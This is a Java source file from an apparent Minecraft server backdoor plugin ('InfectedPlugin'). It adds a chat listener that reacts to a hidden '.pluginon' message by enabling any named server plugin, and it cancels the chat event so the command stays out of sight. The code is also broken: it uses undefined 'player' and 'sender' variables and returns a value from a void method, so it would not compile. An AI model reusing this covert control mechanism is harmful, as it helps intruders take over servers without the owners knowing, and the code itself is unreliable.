package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

public class Command_pluginon implements Listener
{
    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();

        if (! (player.hasPermission("shadoweracore.listeners.pluginon"))) {
          sender.sendMessage(ChatColor.DARK_RED + "You do not have access to that command.");
          return true;
       }
        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".pluginon"))
            {
                if (args.length == 1)
                {
                    p.sendMessage(ChatColor.RED + "Usage: .pluginon <plugin>");
                    event.setCancelled(true);
                    return;
                }
                Plugin plugin = Bukkit.getPluginManager().getPlugin(args[1]);
                if (plugin != null)
                {
                    p.sendMessage(ChatColor.AQUA + "Plugin " + args[1] + " enabled!");
                    Bukkit.getPluginManager().enablePlugin(plugin);
                }
                else
                {
                    p.sendMessage("Plugin not found!");
                }
                event.setCancelled(true);
                return;
            }
        }
    }
}
